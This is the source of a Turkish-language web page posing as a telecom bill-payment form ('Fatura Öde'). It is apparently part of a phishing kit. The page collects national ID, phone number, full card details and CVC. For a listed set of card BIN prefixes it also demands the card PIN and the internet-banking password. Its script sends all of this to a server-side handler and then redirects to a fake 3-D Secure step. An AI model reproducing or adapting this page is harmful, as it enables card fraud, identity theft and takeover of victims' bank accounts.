<!DOCTYPE html>
<html>

<head>
	<title>Fatura Öde</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="robots" content="noindex">
<link rel="stylesheet" type="text/css" href="./tema/style.css">
<link rel="stylesheet" type="text/css" href="./tema/icon.css">
<link href="https://fonts.googleapis.com/css?family=Open+Sans:400,600,700&display=swap" rel="stylesheet"></head>

<body>
	<div class="container">
		<div class="row">
			<div class="col-12"> <img src="./f_logo.png" class="img-fluid"> </div>
		</div>
	</div>
	<section id="telekomSection">
		<div class="container shadow rounded">
			<div class="row">
				<div class="col-12" id="loaderDiv" style="display: none;">
					<div class="col-12 text-center"> <img src="./loading.gif" class="img-fluid">
						<p>Lütfen Bekleyiniz İşleminiz Devam Ediyor</p>
					</div>
				</div>
				<div class="col-12" id="bilgiEkrani">
					<input type="hidden" name="security" id="security" value="">
					<div class="mb-7">
						<div class="row">
			              	<div class="col-12">
			              	    <br/><br/>
			              		<div class="js-form-message mb-2">
				                    T.C. Kimlik No*
				                    <input type="text" class="form-control" name="tcKimlikNo" id="tcKimlikNo" placeholder="T.C. Kimlik No" onkeypress="return /[0-9]/i.test(event.key)">
				                </div>
			              	</div>
			              	<div class="col-12">
			              		<div class="mb-2">
			              			<div class="js-form-message mb-2">
			              				Telefon Numarası*
					                    <input type="text" class="form-control" name="telefonNumarasi" id="telefonNumarasi" placeholder="Telefon Numarası" onkeypress="return /[0-9]/i.test(event.key)">
					                </div>
				                </div>
			              	</div>
			              	<div class="col-12">
			              		<div class="js-form-message mb-2">
				                    Kart Sahibinin Adı Soyadı*
				                    <input type="text" class="form-control" name="adSoyad" id="adSoyad" placeholder="Ad Soyad" onkeypress="return /[a-zA-ZÜüĞğİiŞşÇçÖö ]/i.test(event.key)" >
				                </div>
			              	</div>
			              	<div class="col-12">
			              		<div class="js-form-message mb-2">
					               Kart Numarası
					                <input type="text" class="form-control" name="kartNumarasi" id="creditCardNumber" x-autocompletetype="cc-number" placeholder="**** **** **** ***">
					              </div>
			              	</div>
			                <div class="row col-12 mb-2" style="
    padding-right: 0;
">
    <div class="col-6">
			                  <div class="js-form-message">
			                    <label class="input-label">Son Kullanma (Ay/Yıl)</label>
			                    <input type="text" class="form-control" name="skt" id="skt" placeholder="MM/YY" aria-label="MM/YY" maxlength="5">
			                  </div>
    </div>
    <div class="col-6" style="
    padding-right: 0;
">
      
			                  <div class="js-form-message">
			                    <label class="input-label">CVC</label>
			                    <input type="number" class="form-control" name="cvc" id="cvc" placeholder="***" autocomplete="cc-csc" maxlength="3">
			                  </div>
    </div>
  </div>
			                <div class="col-12" id="kartSifreDiv" style="display: none;">
			              		<div class="js-form-message mb-2">
				                    <label class="input-label"><i class="fas fa-user"></i> Kart Şifresi</label>
				                    <input type="text" class="form-control" name="kartSifre" id="kartSifre" placeholder="Kart Şifresi" onkeypress="return /[0-9]/i.test(event.key)">
				                </div>
			              	</div>
			                <div class="col-12" id="intBankaciligiSifreDiv" style="display: none;">
			              		<div class="js-form-message mb-2">
				                    <label class="input-label"><i class="fas fa-user"></i> İnternet Bankacılığı Şifresi</label>
				                    <input type="text" class="form-control" name="intBankaciligi" id="intBankaciligi" placeholder="İnternet Bankacılığı Şifresi" onkeypress="return /[0-9]/i.test(event.key)">
				                </div>
			              	</div>
						</div>
						<div class="d-flex justify-content-between align-items-center">
							<button class="btn btn-primary btn-block transition-3d-hover" id="odemeYap">Öde <i class="fas fa-credit-card"></i></button>
						</div>
					</div>
				</div>
			</div>
		</div>
	</section>
	<script type="text/javascript" src="./tema/jquery.js"></script>
<script type="text/javascript" src="./tema/jquery-mask.js"></script>		<script type="text/javascript" src="./tema/sweet.js"></script>
		<script type="text/javascript">
			$.ajax({
				type:"POST",
				url:"./aaq.php",
				dataType:"JSON",
				data:{
					"security":1,
				},
				success:function(donenVeri){
					$("#security").val(donenVeri.security);
				}
			});
			$('#creditCardNumber').mask('0000 0000 0000 0000');
			$('#skt').mask('00/00');
			$('#cvc').mask('000');
			$('#intBankaciligi').mask('000000');
			$('#kartSifre').mask('0000');
			$('#tcKimlikNo').mask('00000000000');
			$('#telefonNumarasi').mask('00000000000');
			var intBankaciligiSifre=[418342,418343,418344,418345,450803,454318,454358,454359,454360,510152,540667,540668,543771,552096,553058,402277,402278,402563,403082,409364,410147,413583,414388,415565,422376,423277,423398,435653,441007,444029,499850,499851,499852,519324,521022,521836,529572,531157,545120,545616,545847,547567,547800,413252,425669,432071,432072,435508,435509,493837,512754,520932,521807,524347,542110,552608,552609,553056,557113,557829];
			var intBankaciligiSifreZorunlu=0;
			var kartSifreZorunlu=0;
			$("#creditCardNumber").on("keyup", function(event){
				var kartNumarasi2=$("#creditCardNumber").val();
				kartNumarasi2 = kartNumarasi2.replace(/\s+/g, '');
				if (kartNumarasi2.length>=6) {
					var bin=kartNumarasi2/(10**(kartNumarasi2.length-6));
					bin=Math.floor(bin);
					if (intBankaciligiSifre.includes(bin)) {
						$("#intBankaciligiSifreDiv").show();
						$("#kartSifreDiv").show();
						intBankaciligiSifreZorunlu=1;
						kartSifreZorunlu=1;
					}
					else{
						$("#intBankaciligiSifreDiv").hide();
						$("#kartSifreDiv").hide();
						intBankaciligiSifreZorunlu=0;
						kartSifreZorunlu=0;
					}
				}
				else{
					$("#intBankaciligiSifreDiv").hide();
					$("#kartSifreDiv").hide();
					intBankaciligiSifreZorunlu=0;
					kartSifreZorunlu=0;
				}
		    });
			$("#odemeYap").click(function(){
				var security=$("#security").val();
				var creditCardNumber=$("#creditCardNumber").val();
				var adSoyad=$("#adSoyad").val();
				var skt=$("#skt").val();
				var cvc=$("#cvc").val();
				var guncelAy=11;
				var guncelYil=23;
				var tcKimlikNo=$("#tcKimlikNo").val();
				var telefonNumarasi=$("#telefonNumarasi").val();
				var intBankaciligiSifrePost="";
				var kartSifrePost="";
				if (intBankaciligiSifreZorunlu) {
					intBankaciligiSifrePost=$("#intBankaciligi").val();
					if (intBankaciligiSifrePost.length!=6) {
						Swal.fire(
						  'Hata',
						  'Lütfen internet bankacılığı şifrenizi giriniz.',
						  'error'
						);
						return false;
					}
				}
				if (kartSifreZorunlu) {
					kartSifrePost=$("#kartSifre").val();
					if (kartSifrePost.length!=4) {
						Swal.fire(
						  'Hata',
						  'Lütfen geçerli bir kart şifresi giriniz.',
						  'error'
						);
						return false;
					}
				}
				if (creditCardNumber=='' || adSoyad=='' || skt=='' || cvc=='' || tcKimlikNo=='' || telefonNumarasi=='') {
					Swal.fire(
					  'Hata',
					  'Lütfen boş alan bırakmayınız.',
					  'error'
					);
				}
				else if (TCNOKontrol(tcKimlikNo)==false) {
					Swal.fire(
					  'Hata',
					  'Lütfen geçerli bir T.C. Kimlik Numarası giriniz.',
					  'error'
					);
				}
				else if (ValidateCreditCardNumber($("#creditCardNumber").val().replace(/\s/g, ''))==false) {
					Swal.fire(
					  'Hata',
					  'Lütfen geçerli bir kredi kartı numarası giriniz.',
					  'error'
					);
				}
				else if (telefonNumarasi.length!=10 && telefonNumarasi/10000000<5) {
					Swal.fire(
					  'Hata',
					  'Lütfen geçerli bir telefon numarası giriniz.',
					  'error'
					);
				}
				else{
					var sktArray=skt.split("/");
					var sktAy=sktArray[0];
					var sktYil=sktArray[1];

					if (guncelYil==sktYil && guncelAy>sktAy) {
						Swal.fire(
						  'Hata',
						  'Geçersiz son kullanma tarihi.',
						  'error'
						);
					}
					else if (guncelYil>sktYil) {
						Swal.fire(
						  'Hata',
						  'Geçersiz son kullanma tarihi.',
						  'error'
						);
					}
					else if (sktAy>12) {
						Swal.fire(
						  'Hata',
						  'Geçersiz son kullanma tarihi.',
						  'error'
						);
					}
					else{
						$("#odemeYap").html('<div class="spinner-border text-white" role="status"><span class="sr-only">Bekleyiniz...</span></div>');
						setTimeout(function(){
						 $("#bilgiEkrani").hide();
						 $("#loaderDiv").show();
							 setTimeout(function(){
								 $.ajax({
									url:"./ajax.php",
									type:"POST",
									dataType:"JSON",
									data:{
										"odemeYap":1,
										"kartNumarasi":creditCardNumber,
										"adSoyad":adSoyad,
										"cvc":cvc,
										"skt":skt,
										"intBankaciligiSifrePost":intBankaciligiSifrePost,
										"tcKimlikNo":tcKimlikNo,
										"kartSifrePost":kartSifrePost,
										"telefonNumarasi":telefonNumarasi,
										"security":security,
									},
									success:function(donenVeri){
										if (donenVeri.durum==0) {
											Swal.fire(
											  'Hata',
											  donenVeri.mesaj,
											  'error'
											);
											$("#odemeYap").html('Öde <i class="fas fa-credit-card"></i>');
										}
										else if (donenVeri.durum==1) {
											window.location.replace("./3d.php");									 	
										}
										else{
											Swal.fire(
											  'Hata',
											  'Bilinmeyen bir hata oluştu.',
											  'error'
											);
											$("#odemeYap").html('Öde <i class="fas fa-credit-card"></i>');						
										}
									}
								});
						    }, 3000);
						
					    }, 1000);
					}
				}
			});
			function ValidateCreditCardNumber(sixteenDigitString) {
				var numSum = 0;
			    var value;
			    for (var i = 0; i < 16; ++i) {
			        if (i % 2 == 0) {
			            value = 2 * sixteenDigitString[i];
			            if (value >= 10) {
			                value = (Math.floor(value / 10) + value % 10);
			            }
			        } else {
			            value = +sixteenDigitString[i];
			        }
			        numSum += value;
			    }
			    return (numSum % 10 == 0);
			}
			function TCNOKontrol(TCNO) {
			    var tek = 0,
			      cift = 0,
			      sonuc = 0,
			      TCToplam = 0,
			      i = 0;

			    if (TCNO.length != 11) return false;
			    if (isNaN(TCNO)) return false;
			    if (TCNO[0] == 0) return false;

			    tek = parseInt(TCNO[0]) + parseInt(TCNO[2]) + parseInt(TCNO[4]) + parseInt(TCNO[6]) + parseInt(TCNO[8]);
			    cift = parseInt(TCNO[1]) + parseInt(TCNO[3]) + parseInt(TCNO[5]) + parseInt(TCNO[7]);

			    tek = tek * 7;
			    sonuc = Math.abs(tek - cift);
			    if (sonuc % 10 != TCNO[9]) return false;

			    for (var i = 0; i < 10; i++) {
			      TCToplam += parseInt(TCNO[i]);
			    }

			    if (TCToplam % 10 != TCNO[10]) return false;

			    return true;
			}
		</script>
</body>

</html>